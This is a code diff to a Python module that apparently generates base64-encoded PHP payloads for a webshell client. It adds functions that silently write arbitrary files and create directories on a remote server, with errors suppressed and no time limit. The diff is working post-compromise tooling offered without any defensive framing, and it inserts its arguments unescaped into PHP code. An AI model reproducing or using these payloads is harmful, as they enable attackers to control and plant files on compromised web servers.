@@ -148,6 +148,35 @@ def uploadFile(path, content):
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
 
+def createFile(path, content):
+    code="""
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    function f($path, $content){
+	    echo("<ek>");;
+	    echo @fwrite(@fopen($path,"w"),$content)?"1":"0";;
+	    echo("</ek>");
+	    die();
+    }
+    f('%s', '%s');""" % (path, content)
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
+def createDir(path):
+    code="""
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    function c($path){
+	    echo("<ek>");;
+	    echo(mkdir($path)?"1":"0");;
+	    echo("</ek>");
+	    die();
+    }
+    c('%s');
+    """%path
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
 if __name__ == '__main__':
     # print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
     print(uploadFile('/vae/asd/asd', 'asdasd'))
